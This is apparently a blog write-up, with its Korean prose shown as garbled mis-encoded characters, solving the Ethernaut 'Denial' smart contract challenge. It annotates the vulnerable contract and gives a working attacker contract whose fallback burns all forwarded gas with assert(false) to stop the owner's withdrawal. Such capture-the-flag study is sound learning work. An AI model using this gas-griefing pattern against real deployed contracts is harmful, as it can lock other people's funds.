---
emoji: ๐งข
title: (Ethernaut ์ทจ์ฝ์  20) Denial
date: '2022-02-07 12:50:00'
author: ํ์ฑ์
tags: ethernaut Denial vulnerability 20
categories: ์ทจ์ฝ์ ๋ถ์
---


# ๐ 1. Denial
__Difficulty 5/10__

- ์น๋ฆฌ ์กฐ๊ฑด
- ์ฝ๋ ๋ถ์
- ํ์ด
์์๋ก ์งํ ๋  ๊ฒ์ด๋ค.

- - -

## ์น๋ฆฌ ์กฐ๊ฑด
- Owner๊ฐ withdrawํ์ง ๋ชปํ๊ฒํ๋ฉด ์น๋ฆฌํ๋ค.
- Owner ์ธ์ถ๋ถ๊ฐ ์ํ ๋ง๋ค๊ธฐ

- - -

## ์ฝ๋ ๋ถ์
๋ถ์์ ์ฃผ์์ ์์ต๋๋ค!

```solidity
contract Denial {

    using SafeMath for uint256;
    //  ํํธ๋๊ฐ ๋์ด ์๊ธ์ 1%์ฉ ์ธ์ถ ํ  ์ ์๋ค.
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    //  Owner์ Address
    address payable public constant owner = address(0xA9E);
    //  ๋ง์ง๋ง์ผ๋ก withdrawํ์๋์ ์๊ฐ
    uint timeLastWithdrawn;
    // ํํธ๋๋ณ withdrawํ ์ก์
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    //  ๋๊ตฌ๋ ์์  ๋๋ ๋ค๋ฅธ address๋ฅผ ํํธ๋๋ก ์ค์ ํ  ์ ์๋ค.
    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    //  withdraw 1% to recipient and 1% to owner
    //  owner์ ํํธ๋๊ฐ 1%์ฉ ์ธ์ถ ํ  ์ ์๋ค.
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        // ์์ฑ์์ ์๋๋ call์ ์ฌ์ฉํจ์ผ๋ก์จ partner๊ฐ ๊ณ ์์ ์ผ๋ก revertํด๋ owner๊ฐ 1%์ ๋ฐ๊ฒํ๊ธฐ ์ํจ์ด๋ค.
        partner.call{value:amountToSend}("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        // ๋ง์ง๋ง์ผ๋ก withdrawํ ์๊ฐ
        timeLastWithdrawn = now;
        // ํํธ๋๊ฐ withdrawํ amount
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }

    // allow deposit of funds
    // ๋ชจ๋  ์๊ธ์ ํ์ฉํ๋ค.
    receive() external payable {}

    // convenience function
    // contract๊ฐ ๊ฐ์ง๊ณ  ์๋ ether์ ์๋ฅผ ํ์ธํ๋ ํจ์
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }

}
```
- - -

## ํ์ด
### ๋ค์ด๊ฐ๊ธฐ ์ 
์ด ๋ฌธ์ ๋ call๊ณผ transfer์ ์ฐจ์ด๋ฅผ ์ ์์์ผ ํ ์ ์๋ ๋ฌธ์ ์ด๋ค.

#### transfer
- ์์  ์ค๋งํธ ๊ณ์ฝ์๋ fallback ํจ์๊ฐ ์ ์๋์ด ์์ด์ผ ํ๋ค. ๊ทธ๋ ์ง ์์ผ๋ฉด ์ ์ก ํธ์ถ์ ์ค๋ฅ๊ฐ ๋ฐ์ํ๋ค. `transfer`์ ๊ฐ์ค ์ ํ๋์ 2300์ผ๋ก `transfer`์ ์๋ฃํ๊ธฐ์ ํ ์์ด๋ค.

#### send
- `transfer`๊ณผ ์ ์ฌํ ๋ฐฉ์์ผ๋ก ์๋ํ๋ฉฐ ๊ฐ์ค ์ ํ๋ 2300์ด๋ค. ํ์ง๋ง `transfer`๊ณผ ๋ค๋ฅด๊ฒ status๋ฅผ `bool` ๊ฐ์ผ๋ก ๋ฐํํ๋ค.

#### call
- smart contract์ ETH๋ฅผ ๋ณด๋ด๋ ๊ถ์ฅ๋๋ ๋ฐฉ๋ฒ์ด๋ค. call์ ๋น ์ธ์๋ ์์  ์ฃผ์์ fallback ํจ์๋ฅผ ์คํ์ํจ๋ค.

 
    ```solidity
    (bool sent,memory data) = _to.call{value: msg.value}("");
    ```
    `call`์ ์ฌ์ฉํ์ฌ contract์ ์ ์๋ ๋ค๋ฅธ ๊ธฐ๋ฅ์ ์คํ์ํค๊ณ  ํจ์๋ฅผ ์คํํ๊ธฐ ์ํด ๊ณ ์ ๋ ์์ ๊ฐ์ค๋ฅผ ๋ณด๋ผ ์๋ ์๋ค. ํธ๋์ญ์์ ์ํ๊ฐ `bool`๊ฐ์ผ๋ก ์ ์ก๋๊ณ  return ๊ฐ์ด ๋ฐ์ดํฐ ๋ณ์๋ก ์ ์ก๋๋ค. ๊ณ ์ ๋ ์์ gas๋ฅผ ๋ณด๋ด์ง ์๋๋ค๋ฉด ์ฌ์ฉ๊ฐ๋ฅํ ๋ชจ๋  gas๋ฅผ ๋ณด๋ธ๋ค.

<br/>

์ฐ๋ฆฌ๋ call์ ์ฌ์ฉํด ๊ฐ์ ธ์ค๋ gas ๋ชจ๋ ์๋ชจํด ๋ฌธ์ ๋ฅผ ํด๊ฒฐํ  ์ ์๋ค.
### ํ์ด
๊ทธ๋ ๋ค๋ฉด ์ด๋ป๊ฒ ๋ชจ๋  gas๋ฅผ ์๋ชจํ  ์ ์์๊น?
gas๋ฅผ ๋ชจ๋ ์๋ชจํ  ์ ์๋ ๋ฐฉ๋ฒ์ด ๋ช๊ฐ์ง ์๋ค.
1. while(true){}
2. assert

* `assert`๋ `revert`์ `require`๊ณผ ๋ค๋ฅด๊ฒ ๋ชจ๋  gas๋ฅผ ์๋ชจ์ํจ๋ค. ์ฆ assert๊ฐ ์๋ ๋ค๋ฅธ ๊ฒ์ ์ฌ์ฉํ์ฌ `revert`ํ๋ฉด gas๋ฅผ ์ ๋ถ ์๋ชจ์ํฌ ์ ์์๋ค.

* ํ์๋ reentrency๋ฅผ ์ฌ์ฉํ์ฌ ํ๋ คํ์์ง๋ง reentrency๋ฅผ ์ฌ์ฉํ์์๋ Denial contract์ ์๊ธฐ์น ๋ชปํ ERROR๋ฅผ ๋ง๋ค ์๋ ์์ง๋ง owner์๊ฒ ETH๊ฐ ์ ์ก๋์ด ์คํจํ์๋ค. ๊ทธ๋์ ๊ฐ์ค๋ฅผ ๋ค ์๋ชจํ  ์ ์๋ ๋ค๋ฅธ ๋ฐฉ๋ฒ์ ์ฌ์ฉํ์๋ค.

ํ์๋ 2๋ฒ์ ์ฌ์ฉํ์ฌ ๋ฌธ์ ๋ฅผ ํ์๋ค.

์ฐ์  Denial Attack Contract์ fallback์ ๋ง๋ค์ด๋ณด์
```solidity
contract DenialAttack {

    Denial denial;
    // ๊ณต๊ฒฉํ  contract๋ฅผ Denial contract๋ก ์ค์ 
    constructor(address payable _denial) public {
        denial = Denial(_denial);
    }

    // attack์ ์งํํ๋ ํจ์
    function attack() public {
        // DenialAttack contract๋ฅผ ํํธ๋๋ก ๋ง๋ค๊ณ  withdraw์คํ
        denial.setWithdrawPartner(address(this));
        denial.withdraw();
    }

    // withdraw์ดํ ETH๊ฐ ์ ์ก๋  ๋ fallback์ ์คํ์ํค๋ฉฐ ๋ชจ๋  gas์๋ชจ
    fallback() external payable{
        //๋ฐฉ๋ฒ 1. while(true){}
        //๋ฐฉ๋ฒ 2. assert(false);
        assert(false);
        }

} 
```
<br/>
์ด ์ฝ๋๋ฅผ remix๋ฅผ ํตํด Rinkeby network์ deployํ ํ attack()์ ์คํ์์ผ์ฃผ๋ฉด ๋๋๋ค.

attack()์ ์คํ์ํจ ํ transaction์ด ์๋ฃ๋๋ฉด etherscan์์ gas limit์ ์ด๊ณผํด ์๋ฌ๊ฐ ๋ฌ๋ค๊ณ  ๋ค์๊ณผ ๊ฐ์ด ๋์ฌ ๊ฒ์ด๋ค.

![gas](./gas_denial.png)

<br/>


์๋ฌ๋ฅผ ํ์ธํ๋ค๋ฉด ethernaut์ผ๋ก ๋์์ Submit instance๋ฅผ ๋๋ฅด๊ณ  ์กฐ๊ธ ๊ธฐ๋ค๋ฆฌ๋ฉด block์ด mine๋๊ณ , ์๋์ ๊ฐ์ด ๋จ๋ฉฐ ๋ง๋ฌด๋ฆฌ๋๋ค.
```
ูฉ(- ฬฎฬฎฬ-ฬ)?ถ Well done, You have completed this level!!!
```
- - -

## ๋ง๋ฌด๋ฆฌ
์ญ์ ethernaut๋ฅผ ํ๋ฉด์ solidity์ ๋ํด ๋ค์ ๋ณต์ตํ๊ณ  ์๋๊ฒ ๊ฐ๋ค. `send vs transfer vs call`์ ๋ํด์๋ ๋ค์ ์ฐพ์๋ณด๋ฉฐ ๊ณต๋ถํ  ์ ์์๊ณ , assert, revert์ require์ ์ฐจ์ด์ ์ ๊ณต๋ถํ  ์ ์์๋ ๋ฌธ์ ์๋ ๊ฒ ๊ฐ๋ค. 

- - -
## REF
- rinkeyb network ether faucet: https://faucets.chain.link/rinkeby
- ethernaut: https://ethernaut.openzeppelin.com/
- remix IDE: https://remix.ethereum.org


```toc

```